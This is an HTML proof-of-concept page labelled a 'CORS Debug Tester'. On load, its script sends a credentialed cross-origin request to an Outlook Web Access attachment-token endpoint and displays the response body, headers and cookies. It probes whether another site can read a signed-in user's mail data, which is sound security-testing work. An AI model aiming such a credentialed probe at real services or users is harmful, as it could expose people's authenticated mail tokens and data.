<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS Debug PoC</title>
</head>
<body>
  <h1>CORS Debug Tester</h1>
  <p><strong>Status:</strong> <span id="status">Waiting…</span></p>
  <pre id="output" style="white-space: pre-wrap;"></pre>

  <script>
    const target = "https://outlook.office365.com/owa/service.svc?action=GetAttachmentDownloadToken&app=Mail&n=76"; // replace this
    const method = "GET"; // or POST
    const sendCredentials = true; // set to true to test cookies

    const data = {
      test: "cors-debug"
    };

    async function testCORS() {
      document.getElementById("status").textContent = "Sending request...";

      const headers = {
        "Content-Type": "application/json"
      };

      const options = {
        method: method,
        mode: "cors",
        credentials: sendCredentials ? "include" : "omit",
        headers: headers,
        ...(method === "POST" ? { body: JSON.stringify(data) } : {})
      };

      try {
        const response = await fetch(target, options);

        const result = {
          status: response.status,
          statusText: response.statusText,
          headers: {},
          cookiesSent: document.cookie || "(none)",
        };

        for (let pair of response.headers.entries()) {
          result.headers[pair[0]] = pair[1];
        }

        try {
          const text = await response.text();
          result.body = text;
        } catch (e) {
          result.body = "(Could not read body)";
        }

        document.getElementById("status").textContent = "✅ Response received";
        document.getElementById("output").textContent = JSON.stringify(result, null, 2);
      } catch (err) {
        document.getElementById("status").textContent = "❌ Request failed";
        document.getElementById("output").textContent = err.toString();
      }
    }

    testCORS();
  </script>
</body>
</html>
